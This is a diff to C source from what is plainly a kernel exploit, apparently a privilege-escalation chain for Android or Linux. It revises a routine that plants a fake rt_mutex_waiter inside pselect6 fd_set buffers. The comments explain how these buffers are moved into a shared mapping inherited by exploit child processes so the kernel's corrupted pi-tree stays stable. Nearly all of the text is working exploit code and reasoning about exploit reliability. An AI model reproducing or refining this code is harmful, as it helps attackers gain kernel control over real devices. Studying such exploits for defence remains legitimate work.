@@ -315,9 +315,10 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 }
 
 void slide_pselect_stack_copy(void) {
-  if (!page_base || !fake_lock || !fake_w0) {
-    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
-             page_base, fake_lock, fake_w0);
+  if (!page_base || !fake_lock || !fake_w0 || !slide_shared_fds) {
+    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx "
+             "w0=%016zx shared_fds=%p\n",
+             page_base, fake_lock, fake_w0, (void *)slide_shared_fds);
     return;
   }
 
@@ -340,24 +341,17 @@ void slide_pselect_stack_copy(void) {
     return;
   }
 
-  /* INTENTIONAL LEAK: heap-allocate the pselect6 fd_sets and never free them.
-     kernel rt_mutex pi-tree caches rb_node pointers into these buffers (they
-     embed the fake rt_mutex_waiter). A stack buffer gets destroyed at return;
-     the pi-tree walker then dereferences dangling rb_parent 0x18 (=
-     FAKE_WAITER_OBJ_DIST) and DABT. Leaking keeps buffer alive until cleanup. */
-  fd_set *in = malloc(sizeof(fd_set));
-  fd_set *out = malloc(sizeof(fd_set));
-  fd_set *ex = malloc(sizeof(fd_set));
-  if (!in || !out || !ex) {
-    free(in);
-    free(out);
-    free(ex);
-    close(high_read);
-    if (block_fd != pipefd[0]) { close(block_fd); }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    return;
-  }
+  /* Shared fd_set buffers: allocated once by the preload supervisor in a
+     MAP_SHARED|MAP_ANONYMOUS region and inherited via fork by every exploit
+     child. The kernel rt_mutex pi-tree caches rb_node pointers into these
+     buffers (they embed the fake rt_mutex_waiter at a fixed offset); a child
+     heap buffer vanishes when the forking child dies and a later process (the
+     app install helper) then walks a dangling tree and DABT@0x18. The shared
+     mapping outlives every child and stays resident until the supervisor
+     process itself exits. */
+  fd_set *in = &slide_shared_fds->in;
+  fd_set *out = &slide_shared_fds->out;
+  fd_set *ex = &slide_shared_fds->ex;
   prepare_slide_pselect_fdsets(in, out, ex);
   open_slide_selected_fds(in, out, ex, high_read);
 
